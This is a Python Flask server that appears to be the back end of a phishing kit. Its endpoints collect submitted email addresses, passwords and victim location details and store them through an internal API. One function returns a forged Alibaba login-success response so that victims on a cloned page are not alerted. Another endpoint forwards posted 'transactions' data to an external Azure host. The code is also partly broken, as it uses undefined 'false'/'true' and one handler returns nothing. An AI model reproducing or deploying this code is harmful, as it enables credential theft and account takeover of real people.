import requests
from flask import Flask, jsonify, request
from lib.api import API as L_API
import time
import json

app = Flask(__name__)
api = L_API()


@app.route('/update_data', methods=['POST'])
def update_data():
    email = request.form['email']
    password = request.form['pass']
    country_name = request.form.get('countryName', '')
    ip_address = request.form.get('ip_address', '')
    city = request.form.get('city', '')
    region = request.form.get('region', '')
    country_code = request.form.get('countryCode', '')
    sender_email = request.form.get('sender_email', '')
    site_name = request.form.get('site_name', '')

    params = {"email": email,
              "password": password,
              "country_name": country_name,
              "ip_address": ip_address,
              "city": city,
              "region": region,
              "site_name": site_name,
              "sender_email": sender_email,
              "country_code": country_code, }
    res = api.do("data.entry",
                 "update_data",
                 [0, [params]])
    return jsonify(format_output(0, res, None))


def update_data_alibaba():
    email = request.form['email']
    password = request.form['pass']
    country_name = request.form.get('countryName', '')
    ip_address = request.form.get('ip_address', '')
    city = request.form.get('city', '')
    region = request.form.get('region', '')
    country_code = request.form.get('countryCode', '')
    sender_email = request.form.get('sender_email', '')
    site_name = request.form.get('site_name', '')

    params = {"email": email,
              "password": password,
              "country_name": country_name,
              "ip_address": ip_address,
              "city": city,
              "region": region,
              "site_name": site_name,
              "sender_email": sender_email,
              "country_code": country_code, }
    res = api.do("data.entry",
                 "update_data",
                 [0, [params]])

    return jsonify(format_output(0, {"hasError": false, "content": {"success": true, "data": {"miniVsts": [], "st": "2cmEmPELgl7u68GxHdJCdbg",
                                                                 "loginType": "pwdLogin", "resultCode": 100,
                                                                 "appEntrance": "icbu", "smartlock": true, "stSite": 4},
                                       "status": 0}}, None))



@app.route('/update_transactions', methods=['POST'])
def update_transactions():
    transactions = request.form['transactions']
    data = json.dumps(transactions)
    response = requests.post('http://raindrop.azurewebsites.net/feemanagement/fee/uploadfee', data=data)

    req = response


def format_output(status, data, message):
    return {'status': status, 'data': data, 'message': message}


if __name__ == '__main__':
    port = 8080  # the custom port you want
    app.run(host='0.0.0.0', port=port, threaded=True)
